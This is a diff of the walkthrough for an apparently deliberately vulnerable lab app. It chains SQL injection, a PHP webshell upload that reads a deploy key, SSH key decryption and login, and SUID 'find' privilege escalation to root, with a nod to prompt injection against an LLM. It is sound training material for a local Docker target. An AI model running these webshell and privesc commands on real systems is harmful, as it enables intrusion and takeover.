@@ -37,8 +37,8 @@ Step 3  SQLi        /api/v1/users → dump users + UNION → staff_messages
 Step 3b (optional)  crack j.harris MD5 → login → /messages UI (same DM)
 Step 4  RCE         PHP upload → /static/uploads/shell.png.php?cmd=cat /var/cerodias/deploy.key
 Step 5  Decrypt     openssl + blob (SQLi) + passphrase (RCE) → id_rsa
-Step 6  SSH         ssh -i id_rsa svc_admin@<server>   [Docker — future]
-Step 7  Privesc     SUID → root                         [Docker — future]
+Step 6  SSH         ssh -i id_rsa svc_admin@localhost -p 2222   [Docker]
+Step 7  Privesc     SUID find → root                           [Docker]
 ```
 
 ---
@@ -51,14 +51,17 @@ Step 7  Privesc     SUID → root                         [Docker — future]
 
 ```
 GET /robots.txt
-→ Disallow: /internal-panel   ← crown jewel login
-→ Disallow: /api/v1/          ← SQLi endpoint
-→ Disallow: /admin            ← dead end
-→ Disallow: /orders/          ← IDOR surface
-→ Disallow: /.git             ← git exposure (see below)
+→ Disallow: /internal-panel      ← crown jewel login
+→ Disallow: /api/v1/             ← SQLi endpoint
+→ Disallow: /admin               ← dead end
+→ Disallow: /orders/             ← IDOR surface
+→ Disallow: /.git                ← git exposure (see below)
+→ Disallow: /messages            ← staff inbox (403 unless staff session)
+→ Disallow: /account/settings    ← PHP upload surface (chain step 4)
+→ Disallow: /static/uploads/     ← webshell landing directory
 ```
 
-Five paths. `/admin` is a dead end. All others matter.
+Eight paths. `/admin` is a dead end. All others matter.
 
 #### 0b — .git/ directory exposure
 
@@ -305,25 +308,41 @@ chmod 600 id_rsa
 
 ---
 
-### Step 6 — SSH Access (Crown Jewel) [Docker — future]
+### Step 6 — SSH Access (Crown Jewel) [Docker]
 **Tools**: ssh
-**Surface**: SSH server on the Docker container
+**Surface**: SSH server on the Docker container (port 2222)
 **Requires**: `id_rsa` from step 5, username `svc_admin` (from recon step 0)
+**Setup**: `docker-compose up --build` from the project root
 
 ```bash
 ssh -i id_rsa svc_admin@localhost -p 2222
 ```
 
-**Crown jewel**: shell on the server.
+The SSH container reads `id_rsa.pub` from a shared Docker volume (written by Flask at
+startup) and installs it as svc_admin's authorized_keys on container boot.
+
+**Crown jewel**: shell on the server as svc_admin.
 
 ---
 
-### Step 7 — SUID Privilege Escalation [Docker — future]
+### Step 7 — SUID Privilege Escalation [Docker]
+**Tools**: find, sh
+**Surface**: SSH session from step 6
+**Requires**: shell on the Docker container
 
-Enumerate SUID binaries: `find / -perm -4000 2>/dev/null`
+Enumerate SUID binaries:
 
-A GTFOBins-exploitable binary (e.g. `vim`, `find`, or a custom `cerodias-backup`
-binary) is installed with SUID. Exploit it to get a root shell.
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+`/usr/bin/find` has the SUID bit set. GTFOBins exploit:
+
+```bash
+find . -exec /bin/sh -p \; -quit
+```
+
+**Crown jewel**: root shell on the container.
 
 ---
 
@@ -415,7 +434,11 @@ Manual checklist:
 - [ ] Upload `shell.png.php` with valid PNG magic bytes via Burp → accepted
 - [ ] `/static/uploads/shell.png.php?cmd=id` returns OS user
 - [ ] `/static/uploads/shell.png.php?cmd=cat /var/cerodias/deploy.key` returns passphrase
-- [ ] base64-decode encrypted_ssh_key → openssl decrypt → valid RSA PEM
+- [ ] base64-decode encrypted_ssh_key + openssl decrypt = valid RSA PEM
+- [ ] `docker-compose up --build` starts web (5001) and ssh-server (2222)
+- [ ] `ssh -i id_rsa svc_admin@localhost -p 2222` gives shell (Docker required)
+- [ ] `find / -perm -4000 2>/dev/null` reveals SUID find binary (Docker)
+- [ ] `find . -exec /bin/sh -p \; -quit` gives root shell (Docker)
 
 ---
 
@@ -436,12 +459,18 @@ Manual checklist:
 ## Environment
 
 ```bash
-# Run with real LLM (prompt injection works):
+# Run without Docker (Steps 0-5 only):
+pip install -r requirements.txt
+python run.py
+
+# Run with Docker (full chain, Steps 0-7):
+docker-compose up --build
+# Web: http://localhost:5001
+# SSH: ssh -i id_rsa svc_admin@localhost -p 2222
+
+# Run with Ollama (real prompt injection, Step 1):
 ollama pull mistral
 LLM_MODEL=ollama OLLAMA_MODEL=mistral python run.py
-
-# Run without LLM (mock fallback, prompt injection is stub):
-python run.py
 
 # Run tests:
 pytest tests/ -v
